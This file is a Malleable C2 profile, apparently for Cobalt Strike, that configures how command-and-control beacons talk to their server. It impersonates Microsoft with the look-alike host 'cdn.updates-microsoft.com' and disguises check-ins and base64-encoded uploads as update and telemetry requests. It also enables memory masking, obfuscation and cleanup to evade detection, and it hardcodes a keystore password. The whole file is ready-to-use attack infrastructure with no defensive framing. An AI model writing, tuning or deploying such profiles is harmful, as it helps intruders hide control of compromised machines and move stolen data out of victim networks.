
# Malleable C2 Profile
#
# This profile is generated to configure C2 communications with customized HTTP GET/POST requests,
# metadata handling, URI rules, and SSL/TLS configurations.

set host "cdn.updates-microsoft.com";

https-certificate {
    set keystore "valid-ssl-cert.store";
    set password "S3cur3P@ssw0rd!2024";
}

http-get {
    set uri ["/api/v2/updates", "/cdn/assets/scripts", "/services/telemetry", "/content/resources"];
    
    client {
        header "Host" "cdn.updates-microsoft.com";
        header "User-Agent" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0";
        header "Accept" "*/*";
        header "Referer" "http://cdn.updates-microsoft.com/";
        metadata {
            netbios;
            prepend "__RequestVerificationToken=";
            header "Cookie";
        }
    }
    
    server {
        header "Content-Type" "application/octet-stream";
        header "Connection" "Keep-Alive";
    }
}

http-post {
    set uri "/api/v2/telemetry/submit";
    
    client {
        id {
            netbios;
        }
        
        output {
            base64;
        }
    }
    
    server {
        header "Content-Type" "application/octet-stream";
        output {
            base64;
        }
    }
}

stage {
    set sleep_mask "true";
    set cleanup "true";
    set userwx "false";
}

process-inject {
    set startrwx "false";
    set userwx "false";
}

post-ex {
    set obfuscate "true";
    set cleanup "true";
}

# Sleep and Jitter configuration
set jitter "35";
set sleeptime "45000";
